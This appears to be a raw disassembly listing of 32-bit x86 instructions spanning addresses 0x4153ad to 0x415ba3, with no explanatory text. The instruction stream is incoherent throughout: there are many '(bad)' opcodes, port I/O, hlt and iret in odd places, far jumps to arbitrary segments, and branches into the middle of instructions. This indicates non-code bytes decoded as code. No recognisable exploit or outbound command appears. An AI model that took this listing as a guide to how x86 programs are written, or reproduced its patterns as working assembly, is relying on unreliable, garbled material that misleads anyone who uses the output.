  4153ad:	xor    eax,eax
  4153af:	fsub   st(3),st
  4153b1:	mov    edx,0x555ac9ab
  4153b6:	sbb    bh,BYTE PTR [ecx]
  4153b8:	inc    ecx
  4153b9:	or     ch,BYTE PTR [edi-0x7e]
  4153bc:	bound  ebp,QWORD PTR [ebp-0x4]
  4153bf:	inc    esp
  4153c0:	idiv   BYTE PTR [ebp+0x7919c88f]
  4153c6:	mov    eax,esi
  4153c8:	jmp    0x4153b7
  4153ca:	cmc    
  4153cb:	jnp    0x4153d2
  4153cd:	jge    0x41544c
  4153cf:	inc    edx
  4153d0:	pop    ebp
  4153d1:	les    esp,FWORD PTR [ebp-0xc534738]
  4153d7:	mov    ebp,eax
  4153d9:	stc    
  4153da:	mov    dh,0x82
  4153dc:	out    0xb1,al
  4153de:	stos   BYTE PTR es:[edi],al
  4153df:	jae    0x415395
  4153e1:	mov    gs,WORD PTR [ebp+0x16ecf062]
  4153e7:	enter  0xe84b,0x0
  4153eb:	std    
  4153ec:	in     al,0xa5
  4153ee:	or     edx,DWORD PTR [edx-0x4d]
  4153f1:	add    edi,DWORD PTR [ebx-0x5e]
  4153f4:	in     al,dx
  4153f5:	xchg   ebx,eax
  4153f6:	mov    eax,ds:0x4452e025
  4153fb:	xlat   BYTE PTR ds:[ebx]
  4153fc:	sbb    ch,BYTE PTR [eax]
  4153fe:	int    0x6b
  415400:	es test eax,0x62c8c8ed
  415406:	mov    al,0xe2
  415408:	stos   BYTE PTR es:[edi],al
  415409:	dec    ebx
  41540a:	cdq    
  41540b:	adc    ebp,DWORD PTR [ebx]
  41540d:	sar    ebp,cl
  41540f:	and    eax,0xf5652deb
  415414:	les    ebx,FWORD PTR [edi+0x517ca1df]
  41541a:	scas   eax,DWORD PTR es:[edi]
  41541b:	xchg   esp,eax
  41541c:	repz fisttp WORD PTR [ecx+0x19]
  415420:	loop   0x415402
  415422:	ret    0xfde5
  415425:	cmp    ebp,edi
  415427:	adc    al,0xec
  415429:	rcl    bh,1
  41542b:	leave  
  41542c:	pop    esi
  41542d:	xor    al,0x2d
  41542f:	enter  0x62d3,0x42
  415433:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  415435:	mov    edi,0xf69d325f
  41543a:	cld    
  41543b:	ins    DWORD PTR es:[edi],dx
  41543c:	ins    DWORD PTR es:[edi],dx
  41543d:	jmp    0xbe50:0x9a0bfce2
  415444:	daa    
  415445:	loop   0x41547f
  415447:	iret   
  415448:	mov    bh,0xac
  41544a:	sti    
  41544b:	or     BYTE PTR [esi+ebp*1+0xf9874e5],0x6b
  415453:	fldpi  
  415455:	add    DWORD PTR [edx+0x12cc9cc6],0xf1351006
  41545f:	in     eax,dx
  415460:	in     al,dx
  415461:	cdq    
  415462:	mov    dl,0xc8
  415464:	inc    esp
  415465:	lds    edi,FWORD PTR [eax]
  415467:	sub    BYTE PTR [ebx-0x24],bh
  41546a:	cld    
  41546b:	cmp    eax,0xd7d623bf
  415470:	loopne 0x4154b8
  415472:	cmp    edi,DWORD PTR [eax]
  415474:	out    0x9,al
  415476:	mov    al,0x76
  415478:	data16 cmc 
  41547a:	(bad)  
  41547b:	and    al,0x5f
  41547d:	add    dh,ch
  41547f:	pop    es
  415480:	out    dx,eax
  415481:	test   BYTE PTR [eax-0x7f],bh
  415484:	jmp    0x415452
  415486:	pop    eax
  415487:	addr16 in eax,0x18
  41548a:	frstor ds:0x5dbbdf88
  415490:	mov    bl,0x19
  415492:	sub    bl,al
  415494:	push   ss
  415495:	cmp    ebp,0x47b22558
  41549b:	lock xor bl,BYTE PTR [edi]
  41549e:	ror    al,0xb9
  4154a1:	mov    bl,0x54
  4154a3:	mov    bl,0xf
  4154a5:	sbb    BYTE PTR [ebp+0x16],0xeb
  4154a9:	mov    al,0xe5
  4154ab:	in     eax,dx
  4154ac:	stos   DWORD PTR es:[edi],eax
  4154ad:	in     eax,dx
  4154ae:	psrad  mm5,QWORD PTR [edi]
  4154b1:	fucomip st,st(3)
  4154b3:	test   eax,0xe3991d65
  4154b8:	and    eax,0xa22000da
  4154bd:	pop    ecx
  4154be:	ss pop ds
  4154c0:	outs   dx,BYTE PTR ds:[esi]
  4154c1:	pop    edi
  4154c2:	adc    eax,DWORD PTR [esi+ebx*4]
  4154c5:	mov    ebx,0x8eafc81b
  4154ca:	mov    bh,0x1
  4154cc:	in     al,dx
  4154cd:	fldcw  WORD PTR [eax-0x5]
  4154d0:	jmp    0x415544
  4154d2:	add    edi,ecx
  4154d4:	ret    0xbce0
  4154d7:	sub    al,0x6a
  4154d9:	fistp  QWORD PTR [ebx]
  4154db:	imul   ecx,DWORD PTR [ebx+0x433c3d6d],0xffffffad
  4154e2:	cld    
  4154e3:	xor    dl,BYTE PTR [eax+ecx*2-0x51]
  4154e7:	popa   
  4154e8:	in     al,dx
  4154e9:	fs ror al,1
  4154ec:	aaa    
  4154ed:	ss cmp al,0x72
  4154f0:	xchg   esp,eax
  4154f1:	push   eax
  4154f2:	enter  0x63ca,0xbd
  4154f6:	call   0x6681:0x1d6feb65
  4154fd:	adc    DWORD PTR [ecx+0x7fdd7190],eax
  415503:	in     eax,0x73
  415505:	or     al,0x6c
  415507:	cli    
  415508:	stos   DWORD PTR es:[edi],eax
  415509:	ja     0x4154d5
  41550b:	aam    0xeb
  41550d:	popa   
  41550e:	add    ah,ah
  415510:	aad    0x73
  415512:	sahf   
  415513:	push   0xffffffaa
  415515:	addr16 call 0x6b0ebfe2
  41551b:	mov    WORD PTR [edx-0x143dc17e],?
  415521:	sti    
  415522:	adc    DWORD PTR [esi-0x122a599b],ebp
  415528:	sbb    bh,0x7
  41552b:	xchg   dl,dl
  41552d:	lea    esp,[esi+esi*1+0x6afd01fe]
  415534:	push   eax
  415535:	push   edx
  415536:	xchg   ah,bl
  415538:	loope  0x415528
  41553a:	jne    0x415504
  41553c:	jle    0x41557a
  41553e:	sub    esi,DWORD PTR [eax+0x22]
  415541:	pushf  
  415542:	xchg   esp,eax
  415543:	and    BYTE PTR [esi+0x7ff501b5],dl
  415549:	sar    DWORD PTR [ebp+0x3b],0x0
  41554d:	xchg   ebx,eax
  41554e:	js     0x4154d9
  415550:	daa    
  415551:	icebp  
  415552:	xchg   edx,eax
  415553:	rcl    DWORD PTR [edi],cl
  415555:	cmovnp eax,DWORD PTR [edx-0xf503a15]
  41555c:	mov    dh,ah
  41555e:	cld    
  41555f:	lahf   
  415560:	push   edi
  415561:	in     al,0x62
  415563:	cli    
  415564:	add    DWORD PTR gs:[esi-0x38],ebp
  415568:	arpl   ax,ax
  41556a:	push   edi
  41556b:	daa    
  41556c:	iret   
  41556d:	(bad)  
  41556e:	jge    0x4155c1
  415570:	jmp    0x4155e0
  415572:	sub    al,0x2a
  415574:	sbb    DWORD PTR [ebp-0x20559863],0x4bf8baf9
  41557e:	(bad)
  415581:	mov    ebx,esi
  415583:	sub    eax,0x886cadf4
  415588:	(bad)  
  415589:	mov    dl,0x35
  41558b:	je     0x415593
  41558d:	fistp  QWORD PTR [edx-0x21ba82e5]
  415593:	(bad)  
  415594:	in     al,dx
  415595:	push   eax
  415596:	std    
  415597:	adc    cl,BYTE PTR [esi]
  415599:	push   esp
  41559a:	loopne 0x4155b7
  41559c:	xchg   BYTE PTR cs:[ebx+0x5271d2c8],dl
  4155a3:	sub    eax,0xf8bdab86
  4155a8:	jmp    0x415611
  4155aa:	push   ds
  4155ab:	out    0xa5,eax
  4155ad:	pop    ds
  4155ae:	and    eax,0xa6df5c39
  4155b3:	xchg   edx,eax
  4155b4:	repnz test BYTE PTR [edi+0x17],ch
  4155b8:	dec    esi
  4155b9:	(bad)  
  4155ba:	inc    ch
  4155bc:	aad    0x13
  4155be:	sub    al,dh
  4155c0:	pop    es
  4155c1:	pop    ds
  4155c2:	cmp    DWORD PTR [ebx+0x1f],eax
  4155c5:	fcomip st,st(7)
  4155c7:	es mov eax,0x89650cb1
  4155cd:	(bad)  
  4155ce:	xchg   esp,eax
  4155cf:	sub    ebp,esi
  4155d1:	jl     0x4155de
  4155d3:	mov    cl,BYTE PTR [ebx]
  4155d5:	lahf   
  4155d6:	sub    al,0x43
  4155d8:	mov    esi,0x58cef008
  4155dd:	daa    
  4155de:	shr    DWORD PTR ds:0xb9b6e309,cl
  4155e4:	or     eax,DWORD PTR [ebp+0x39]
  4155e7:	imul   ebp,ebx,0x94851376
  4155ed:	je     0x415646
  4155ef:	pop    eax
  4155f0:	out    0xdf,al
  4155f2:	pop    ds
  4155f3:	inc    edi
  4155f4:	std    
  4155f5:	xor    eax,0x2b403c3
  4155fa:	aam    0x20
  4155fc:	neg    BYTE PTR [esp+ecx*1]
  4155ff:	adc    BYTE PTR ds:0xf4ce805a,ah
  415605:	mov    ebx,0x846bf000
  41560a:	fisttp DWORD PTR [ebx]
  41560c:	clc    
  41560d:	mov    ch,0xf
  41560f:	iret   
  415610:	addr16 add bh,ch
  415613:	ds call 0x6cdf:0x3ac08c7b
  41561b:	lock xor al,0x6e
  41561e:	fsubr  QWORD PTR [edx+0x9]
  415621:	push   ecx
  415622:	in     al,0x8e
  415624:	aam    0x5f
  415626:	hlt    
  415627:	jb     0x4155ba
  415629:	std    
  41562a:	or     al,0x5d
  41562c:	cmp    bl,bh
  41562e:	and    BYTE PTR [ecx+0x230aa54e],bh
  415634:	in     al,0xb7
  415636:	cld    
  415637:	pop    ecx
  415638:	dec    ebx
  415639:	xchg   ebx,eax
  41563a:	pop    esi
  41563b:	inc    edi
  41563c:	mov    ds:0xbec9ac27,al
  415641:	test   bl,0x7
  415644:	inc    eax
  415645:	jmp    0x4155d0
  415647:	hlt    
  415648:	and    BYTE PTR [eax-0x75ca3904],dh
  41564e:	ss jp  0x4156cd
  415651:	push   ebp
  415652:	stc    
  415653:	retf   0xbb95
  415656:	pop    ecx
  415657:	call   0x1b2c:0x667ccaf4
  41565e:	loop   0x415676
  415660:	icebp  
  415661:	pop    esi
  415662:	xchg   ecx,eax
  415663:	cmp    al,0xa4
  415665:	sbb    BYTE PTR [ebx-0x1b98d0de],0xc7
  41566c:	int3   
  41566d:	mov    BYTE PTR [ebx-0x7c2447ea],dl
  415673:	dec    ecx
  415674:	jmp    0x3c4:0x79c53871
  41567b:	inc    eax
  41567c:	jge    0x415679
  41567e:	sub    ecx,eax
  415680:	call   esp
  415682:	add    al,0xca
  415684:	mov    cl,0xbc
  415686:	mov    esi,0x4105eb0d
  41568b:	je     0x4156f8
  41568d:	mov    eax,ebp
  41568f:	mov    ebp,0x3294cf26
  415694:	fbstp  TBYTE PTR ds:[eax-0x2c61707d]
  41569b:	lahf   
  41569c:	inc    ebp
  41569d:	in     al,dx
  41569e:	cld    
  41569f:	(bad)  
  4156a0:	inc    esp
  4156a1:	cld    
  4156a2:	xor    al,0x3c
  4156a4:	jle    0x41563a
  4156a6:	mov    WORD PTR fs:[edi+0x28],es
  4156aa:	sub    eax,0xa3c3bbce
  4156af:	aad    0x2
  4156b1:	frstor [ebp+0x51]
  4156b4:	enter  0xda1d,0xda
  4156b8:	imul   ecx,DWORD PTR [ebx-0x2057880b],0x3f
  4156bf:	scas   eax,DWORD PTR es:[edi]
  4156c0:	nop
  4156c1:	iret   
  4156c2:	sbb    eax,0x9d0d97ab
  4156c7:	sbb    al,0xeb
  4156c9:	rcr    dh,1
  4156cb:	jbe    0x415685
  4156cd:	sub    BYTE PTR [ebx],0x5d
  4156d0:	push   edi
  4156d1:	push   ecx
  4156d2:	lds    ebp,FWORD PTR [eax]
  4156d4:	iret   
  4156d5:	inc    ecx
  4156d6:	or     al,0x9f
  4156d9:	adc    bl,BYTE PTR [ecx]
  4156db:	pop    esp
  4156dc:	xor    bh,BYTE PTR [ebp-0x76]
  4156df:	adc    eax,0xbbfd5c83
  4156e4:	or     dh,BYTE PTR [ebp-0x59e690f9]
  4156ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156eb:	inc    eax
  4156ec:	rcr    bh,0x65
  4156ef:	sub    BYTE PTR [edx+0x1e51fe4f],dl
  4156f5:	or     bh,ch
  4156f7:	(bad)  
  4156f8:	adc    BYTE PTR [ebx],al
  4156fa:	mov    ds:0x92b7f381,al
  4156ff:	lahf   
  415700:	dec    edi
  415701:	loop   0x41571c
  415703:	sub    bl,ch
  415705:	rol    edx,1
  415707:	or     BYTE PTR [esp+ecx*4-0x77],bh
  41570b:	cmp    ebx,ebp
  41570d:	jl     0x415737
  41570f:	mov    esi,0x5be64dba
  415714:	rcr    edi,cl
  415716:	arpl   WORD PTR [ecx],ax
  415718:	add    esi,ebx
  41571a:	xchg   ebx,eax
  41571b:	popf   
  41571c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41571d:	shl    BYTE PTR [ecx],0xaa
  415720:	jmp    0x4156d7
  415722:	cdq    
  415723:	test   DWORD PTR [eax+0x32],eax
  415726:	add    ebx,DWORD PTR [eax-0x3789badb]
  41572c:	pop    edx
  41572d:	cli    
  41572e:	inc    esi
  41572f:	(bad)  
  415730:	lock lock retf 0xeb01
  415735:	mov    ah,0xbd
  415737:	stos   DWORD PTR es:[edi],eax
  415738:	bound  edi,QWORD PTR [ecx-0x1c]
  41573b:	leave  
  41573c:	cld    
  41573d:	loopne 0x4156ed
  41573f:	and    bl,bl
  415741:	push   edx
  415742:	daa    
  415743:	pop    es
  415744:	sub    DWORD PTR [esi],ebx
  415746:	sti    
  415747:	adc    eax,0x836c3b54
  41574c:	jmp    0x41577e
  41574e:	(bad)  
  41574f:	fcomp  QWORD PTR [ebp+0x436995b8]
  415755:	inc    ecx
  415756:	(bad)  
  415758:	sub    eax,0x4aa35d2f
  41575d:	int    0x7c
  41575f:	inc    edi
  415760:	pop    eax
  415761:	and    esi,ebx
  415763:	(bad)  
  415764:	call   0x1be3891e
  415769:	ds mov esp,0x34dcbb52
  41576f:	sub    esp,esi
  415771:	in     eax,dx
  415772:	ins    DWORD PTR es:[edi],dx
  415773:	pop    esp
  415774:	fbld   TBYTE PTR ds:[ebx+0x19]
  415778:	pushf  
  415779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41577a:	ins    BYTE PTR es:[edi],dx
  41577b:	scas   eax,DWORD PTR es:[edi]
  41577c:	jmp    0x41576b
  41577e:	dec    ebp
  41577f:	sub    bh,ah
  415781:	mov    ds:0x350d428f,al
  415786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415787:	shl    DWORD PTR [esi-0x1],1
  41578a:	inc    eax
  41578b:	cmp    ah,ch
  41578d:	dec    eax
  41578e:	(bad)  
  41578f:	loopne 0x41574e
  415791:	sahf   
  415792:	stos   BYTE PTR es:[edi],al
  415793:	ret    0x414e
  415796:	popf   
  415797:	dec    ecx
  415798:	jbe    0x43cf239c
  41579e:	mov    al,ds:0xdce3b029
  4157a3:	mov    esp,0x4aabdeb6
  4157a8:	stc    
  4157a9:	leave  
  4157aa:	das    
  4157ab:	lods   al,BYTE PTR ds:[esi]
  4157ac:	sahf   
  4157ad:	aaa    
  4157ae:	sub    BYTE PTR [ebp+0x237421e7],0xf5
  4157b5:	pop    ecx
  4157b6:	jle    0x41577e
  4157b8:	lahf   
  4157b9:	js     0x415760
  4157bb:	sbb    eax,0x24eadff7
  4157c0:	dec    ecx
  4157c1:	jp     0x4157be
  4157c3:	sub    al,ah
  4157c5:	xor    ch,bh
  4157c7:	xchg   edi,eax
  4157c8:	lea    ebx,[eax]
  4157ca:	mov    esi,0xb82c18d
  4157cf:	enter  0x2191,0x83
  4157d3:	push   ebp
  4157d4:	call   0xebaea25f
  4157d9:	mov    ebx,?
  4157db:	es push ecx
  4157dd:	fisubr DWORD PTR [ebp+0x34d86e8a]
  4157e3:	pop    ss
  4157e4:	leave  
  4157e5:	cs cmp eax,0x72dbb263
  4157eb:	and    bl,ch
  4157ed:	int    0x6e
  4157ef:	sbb    ch,bl
  4157f1:	cli    
  4157f2:	fld    TBYTE PTR [esi]
  4157f4:	and    al,0xe0
  4157f6:	cmp    DWORD PTR [ebx-0x37648bf8],eax
  4157fc:	push   ds
  4157fd:	cmc    
  4157fe:	push   0xfc9c13ce
  415803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415804:	dec    esi
  415805:	adc    esp,ebx
  415807:	in     al,0x61
  415809:	and    al,0x74
  41580b:	enter  0x9d82,0x30
  41580f:	sbb    eax,0x420abddf
  415814:	jmp    0x415877
  415816:	and    bl,BYTE PTR [ebx+ebp*2]
  415819:	adc    DWORD PTR [ebp+0x5ee0985f],ebx
  41581f:	scas   eax,DWORD PTR es:[edi]
  415820:	std    
  415821:	dec    ebp
  415822:	add    DWORD PTR [eax],ebp
  415824:	and    al,0x96
  415826:	in     eax,0x22
  415828:	jmp    0x4157fd
  41582a:	add    esp,ebp
  41582c:	inc    bl
  41582e:	aas    
  41582f:	or     DWORD PTR [edx+0x2d3ad9df],esp
  415835:	out    dx,eax
  415836:	jnp    0x415829
  415838:	sbb    eax,0xedecfd67
  41583d:	repnz rol BYTE PTR [esi-0x342fe110],cl
  415844:	popa   
  415845:	pop    ecx
  415846:	loop   0x4158be
  415848:	sub    eax,0x753aa524
  41584d:	xchg   ebp,eax
  41584e:	bnd call 0x48b64a4d
  415854:	xchg   esp,eax
  415855:	outs   dx,DWORD PTR ds:[esi]
  415856:	inc    edx
  415857:	jno    0x41582b
  415859:	fistp  QWORD PTR [eax-0x5332c93e]
  41585f:	btc    edi,ecx
  415862:	cld    
  415863:	hlt    
  415864:	rol    DWORD PTR [esi-0x12ba0550],0xb1
  41586b:	fidiv  WORD PTR [ecx]
  41586d:	pop    es
  41586e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41586f:	sub    BYTE PTR [ebp-0x21],dl
  415872:	cmp    DWORD PTR [eax+0x40ee9789],ecx
  415878:	popf   
  415879:	mov    dl,0x6c
  41587b:	fsub   st(6),st
  41587d:	(bad)  
  41587f:	loop   0x41588c
  415881:	sbb    bh,ah
  415883:	inc    edi
  415884:	inc    eax
  415885:	mov    eax,0xe38b5c05
  41588a:	mov    ebx,DWORD PTR [edx+0x91621ea]
  415890:	jmp    0x4158cc
  415892:	mov    eax,0xfd8f2f1c
  415897:	loopne 0x415888
  415899:	popa   
  41589a:	cmp    cl,al
  41589c:	mov    bl,0x8a
  41589e:	pop    ds
  41589f:	push   ds
  4158a0:	test   eax,0x76b5f7e0
  4158a5:	cmp    al,0xa7
  4158a7:	mov    BYTE PTR [edx-0x7c724637],bl
  4158ad:	loopne 0x4158ab
  4158af:	cmp    al,0x6f
  4158b1:	jle    0x415892
  4158b3:	jae    0x415888
  4158b5:	jne    0x415881
  4158b7:	enter  0x7bf,0x83
  4158bb:	fld    st(2)
  4158bd:	lds    ebx,FWORD PTR [ebx+0x66]
  4158c0:	jmp    0x6541:0x712e5292
  4158c7:	sbb    dl,bl
  4158c9:	mov    dh,0xdd
  4158cc:	xor    al,0xfb
  4158ce:	(bad)  
  4158cf:	aas    
  4158d0:	lea    esi,[edi+0x30a99d5e]
  4158d6:	sbb    eax,0xfd6524f9
  4158db:	adc    edi,DWORD PTR [ebx]
  4158dd:	or     edi,ebx
  4158df:	imul   esi,DWORD PTR [edi],0xd
  4158e2:	or     al,0xc8
  4158e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e5:	imul   esi,eax,0xc57f780e
  4158eb:	jmp    0x4158a0
  4158ed:	cmp    DWORD PTR [eax-0x38],edx
  4158f0:	inc    edi
  4158f1:	mov    bh,0xcd
  4158f3:	sub    eax,DWORD PTR [edx+ebp*8+0x26e3c8ae]
  4158fa:	les    ebp,FWORD PTR [ebp-0x2a]
  4158fd:	pop    edi
  4158fe:	bound  ebp,QWORD PTR [ecx+eiz*8+0x54]
  415902:	sub    al,0x48
  415904:	loope  0x41592a
  415906:	mov    cl,ah
  415908:	lods   al,BYTE PTR ds:[esi]
  415909:	cmp    eax,0x34e2c7db
  41590e:	pop    esi
  41590f:	scas   eax,DWORD PTR es:[edi]
  415910:	clc    
  415911:	mov    ah,0x44
  415913:	in     eax,0xeb
  415915:	pop    ebp
  415916:	sub    eax,0x3eba4e0e
  41591b:	mov    BYTE PTR [edx+0x53a284df],0xf3
  415922:	stc    
  415923:	aad    0xbe
  415925:	arpl   bp,di
  415927:	fdivp  st(7),st
  415929:	adc    ah,dl
  41592b:	ret    
  41592c:	int3   
  41592d:	sub    eax,0x1a65c836
  415932:	adc    ah,cl
  415934:	inc    eax
  415935:	scas   eax,DWORD PTR es:[edi]
  415936:	shr    BYTE PTR [ebx-0x222ffb1f],1
  41593c:	cs (bad) 
  41593f:	out    0xed,al
  415941:	xchg   ecx,eax
  415942:	lock pop ebp
  415944:	inc    edx
  415945:	jecxz  0x4159b2
  415947:	or     ah,dl
  415949:	jle    0x415917
  41594b:	dec    eax
  41594c:	jns    0x41594c
  41594e:	cmp    cl,bh
  415950:	out    dx,eax
  415951:	test   al,0x6e
  415953:	mov    esi,DWORD PTR [ecx-0x1f]
  415956:	jae    0x415920
  415958:	pop    ebp
  415959:	pop    ss
  41595a:	pop    ecx
  41595b:	cmp    ch,al
  41595d:	and    eax,DWORD PTR [eax]
  41595f:	hlt    
  415960:	dec    dl
  415962:	ror    ebp,cl
  415964:	cmp    eax,0x78817cac
  415969:	rcr    BYTE PTR [ecx+eiz*8],0x1e
  41596d:	fcomip st,st(3)
  41596f:	mov    edi,0x23444f3e
  415974:	push   eax
  415975:	push   edi
  415976:	std    
  415977:	xor    BYTE PTR [ecx-0x25],cl
  41597a:	add    eax,0xa7896428
  41597f:	loopne 0x415960
  415981:	xchg   ecx,eax
  415982:	int    0x42
  415984:	int    0xe0
  415986:	shl    eax,1
  415988:	xchg   DWORD PTR [esi+0x7c],esp
  41598b:	imul   ebx,DWORD PTR [ebp-0x55e40e08],0xeb35a52f
  415995:	js     0x4159c6
  415997:	xchg   edx,eax
  415998:	test   eax,0x9eeaaa50
  41599d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41599e:	stc    
  41599f:	push   eax
  4159a0:	jmp    0x415927
  4159a2:	xchg   DWORD PTR [eax-0x51],ebp
  4159a5:	push   ss
  4159a6:	and    BYTE PTR [edi-0x15],0xe4
  4159aa:	mov    eax,ds:0x7f56a282
  4159af:	test   bl,cl
  4159b1:	ffreep st(2)
  4159b3:	sub    ebp,DWORD PTR [ebx+0x599deedd]
  4159b9:	idiv   esp
  4159bb:	xchg   BYTE PTR [ebp+0x38],al
  4159be:	or     ah,dl
  4159c0:	xchg   ebp,eax
  4159c1:	ins    DWORD PTR es:[edi],dx
  4159c2:	loopne 0x4159fb
  4159c4:	push   ebp
  4159c5:	loopne 0x41599e
  4159c7:	test   al,0x72
  4159c9:	loopne 0x41599d
  4159cb:	xlat   BYTE PTR ds:[ebx]
  4159cc:	inc    esp
  4159cd:	js     0x415a08
  4159cf:	cmp    bl,ch
  4159d1:	mov    dl,0xff
  4159d3:	ins    BYTE PTR es:[edi],dx
  4159d4:	jge    0x41598f
  4159d6:	pop    edx
  4159d7:	push   ecx
  4159d8:	pandn  mm0,mm0
  4159db:	xor    ah,BYTE PTR [esi+eax*8]
  4159de:	mov    ds:0xf0a1f98f,al
  4159e3:	mov    bh,0x62
  4159e5:	scas   al,BYTE PTR es:[edi]
  4159e6:	sbb    BYTE PTR [eax+0x3899df3a],al
  4159ec:	mov    eax,ds:0xb91686a0
  4159f1:	mov    ebp,edi
  4159f3:	mov    ch,0xed
  4159f5:	dec    esi
  4159f6:	cmp    BYTE PTR [edi+ebx*1-0x7e],cl
  4159fa:	retf   
  4159fb:	enter  0xe7c8,0xb3
  4159ff:	sub    al,0xac
  415a01:	(bad)  
  415a02:	cld    
  415a03:	inc    edx
  415a04:	repnz push cs
  415a06:	jg     0x415a10
  415a08:	mov    bl,BYTE PTR [edi+0x10]
  415a0b:	push   0xc8a3e231
  415a10:	xchg   edi,eax
  415a11:	push   0xffffffb3
  415a13:	addr16 out dx,eax
  415a15:	jbe    0x4159a4
  415a17:	adc    BYTE PTR [ecx],bl
  415a19:	pop    edx
  415a1a:	sub    ebx,DWORD PTR [ebx+ebp*8+0x23]
  415a1e:	adc    bl,BYTE PTR [edx-0x3e]
  415a21:	inc    eax
  415a22:	mov    bh,BYTE PTR [ebp-0x7e272283]
  415a28:	and    eax,0xba50851
  415a2d:	add    DWORD PTR [edx+eax*8],eax
  415a30:	jmp    0x415a20
  415a32:	inc    edi
  415a33:	pop    edi
  415a34:	xor    al,0x93
  415a36:	test   BYTE PTR [eax+0x3c],dh
  415a39:	clc    
  415a3a:	loopne 0x415a92
  415a3c:	sbb    eax,0xaa28fd39
  415a41:	fld    QWORD PTR [eax-0x8]
  415a44:	mov    ds:0x4663d5df,eax
  415a49:	(bad)  
  415a4a:	ins    BYTE PTR es:[edi],dx
  415a4b:	ret    
  415a4c:	test   al,0x82
  415a4e:	std    
  415a4f:	xchg   esp,eax
  415a50:	sti    
  415a51:	mov    WORD PTR [eax],gs
  415a53:	push   es
  415a54:	xchg   bx,ax
  415a56:	xor    cl,al
  415a58:	pop    es
  415a59:	shl    DWORD PTR [esi+edi*8+0x2b],1
  415a5d:	sub    bl,BYTE PTR [ebp-0x396028e]
  415a63:	inc    edi
  415a64:	jmp    0x415a84
  415a66:	daa    
  415a67:	or     al,0x49
  415a69:	or     bh,BYTE PTR [edx-0x38]
  415a6c:	push   cs
  415a6d:	iret   
  415a6e:	mov    edi,DWORD PTR [ecx+edi*2]
  415a71:	or     eax,0x64df41fb
  415a76:	sbb    ecx,eax
  415a78:	push   esp
  415a79:	pop    esi
  415a7a:	add    eax,DWORD PTR [edi+0x61]
  415a7d:	shl    dl,0xc7
  415a80:	(bad)  [esi-0x4a]
  415a83:	fnstenv [ecx-0x14520ad6]
  415a89:	adc    ch,BYTE PTR [ecx+0x16b6c84]
  415a8f:	pop    edx
  415a90:	into   
  415a91:	fbstp  TBYTE PTR [eax]
  415a93:	(bad)  [eax-0x3e]
  415a96:	push   eax
  415a97:	cli    
  415a98:	cmp    ecx,DWORD PTR ds:0x7c96ff04
  415a9e:	cmp    eax,0x8a458c8d
  415aa3:	aad    0xb3
  415aa5:	or     DWORD PTR [ebx+0x27ceebe8],ebp
  415aab:	iret   
  415aac:	mov    esp,0xeb89204d
  415ab1:	xor    DWORD PTR ss:[ebx+0x5f],edi
  415ab5:	push   ebp
  415ab6:	shl    BYTE PTR [esi],cl
  415ab8:	retf   0xe7df
  415abb:	xor    DWORD PTR [ebx+0x400f86c9],ebx
  415ac1:	inc    edi
  415ac2:	std    
  415ac3:	add    al,0x3
  415ac5:	add    esi,ebp
  415ac7:	lods   al,BYTE PTR ds:[esi]
  415ac8:	or     eax,0xcc8c8f5
  415acd:	add    DWORD PTR [ecx],0xb03a1cd0
  415ad3:	mov    eax,ds:0xd73a1cea
  415ad8:	pop    esi
  415ad9:	mov    al,ds:0x4f4e489c
  415ade:	xchg   DWORD PTR [eax+0x7dc7921],ebp
  415ae4:	(bad)  [ebx+0x130157f7]
  415aea:	es enter 0x7f7e,0xb1
  415aef:	loopne 0x415b58
  415af1:	ficom  WORD PTR [ebx-0x7c41bb]
  415af7:	es pop esp
  415af9:	iret   
  415afa:	inc    eax
  415afb:	stos   BYTE PTR es:[edi],al
  415afc:	jmp    0x1ccb:0x42100b27
  415b03:	pusha  
  415b04:	test   ecx,ebx
  415b06:	fcmovnb st,st(7)
  415b08:	in     al,dx
  415b09:	es js  0x415acc
  415b0c:	xchg   DWORD PTR [edi],esi
  415b0e:	cmp    esp,DWORD PTR [ebx]
  415b10:	(bad)  
  415b11:	push   edx
  415b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b13:	cmp    ebp,DWORD PTR [ebx-0x46]
  415b16:	jl     0x415b0a
  415b18:	call   0x45db:0x8ec7743e
  415b1f:	add    eax,0x51ca9f05
  415b24:	pop    eax
  415b25:	frndint 
  415b27:	mov    ecx,0xdcbeb951
  415b2c:	cmp    DWORD PTR [edi],eax
  415b2e:	jmp    0x415af7
  415b30:	jg     0x415b91
  415b32:	mov    bl,0x6
  415b34:	leave  
  415b35:	ins    BYTE PTR es:[edi],dx
  415b36:	jnp    0x415b0f
  415b38:	dec    ebx
  415b39:	xor    edx,esp
  415b3b:	test   bl,ch
  415b3d:	mov    dl,0x55
  415b3f:	fidivr DWORD PTR [edx]
  415b41:	adc    DWORD PTR [esi+0x1b390981],ebx
  415b47:	enter  0xe65f,0xa1
  415b4b:	or     eax,0xf958a350
  415b50:	jmp    0x415bc4
  415b52:	rcl    BYTE PTR [esi+edx*2-0x11da546d],cl
  415b59:	fistp  WORD PTR [ebx]
  415b5b:	ret    
  415b5c:	mov    ebp,ebp
  415b5e:	mov    bl,0x5f
  415b60:	(bad)  
  415b62:	shl    BYTE PTR [edi-0x3c033725],cl
  415b68:	into   
  415b69:	push   es
  415b6a:	adc    bh,BYTE PTR [ebx-0x3737b47a]
  415b70:	frstor [esi+0x49c8681f]
  415b76:	shl    BYTE PTR [eax-0x65321515],1
  415b7c:	xchg   edx,eax
  415b7d:	ja     0x415b6e
  415b7f:	pop    eax
  415b80:	cmp    eax,0xfaa6d0df
  415b85:	mov    cl,0x97
  415b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b88:	stos   DWORD PTR es:[edi],eax
  415b89:	jmp    0x6eaba58a
  415b8e:	stos   DWORD PTR es:[edi],eax
  415b8f:	sub    ah,ah
  415b91:	push   esp
  415b92:	gs call 0x3e8b:0x63fdfad
  415b9a:	add    BYTE PTR [esi-0x36],ah
  415b9d:	arpl   WORD PTR [eax],ax
  415b9f:	bound  edi,QWORD PTR [esp+esi*4+0x71]
  415ba3:	dec    esi
